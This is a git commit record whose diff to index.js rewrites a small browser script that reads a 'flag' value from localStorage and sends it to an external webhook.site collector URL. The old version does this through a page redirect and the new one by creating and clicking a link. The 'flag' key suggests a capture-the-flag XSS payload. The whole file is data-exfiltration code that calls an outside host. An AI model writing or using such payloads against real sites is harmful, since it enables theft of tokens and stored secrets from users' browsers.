a77947ad190362f05d7118fd2a977a8a126e3080
Nicolas Ettlin <nicolas.ettlin@me.com>
2024-03-22 18:56:50 +0100

    Fix again

--- index.js
+++ index.js
@@ -1,1 +1,3 @@
-window.location = ('https://webhook.site/8b4bc299-82cc-4d2b-85ed-ec144d527966?' + window.localStorage.getItem('flag'))
+const a = document.createElement('a')
+a.href = ('https://webhook.site/8b4bc299-82cc-4d2b-85ed-ec144d527966?' + window.localStorage.getItem('flag'))
+a.click()
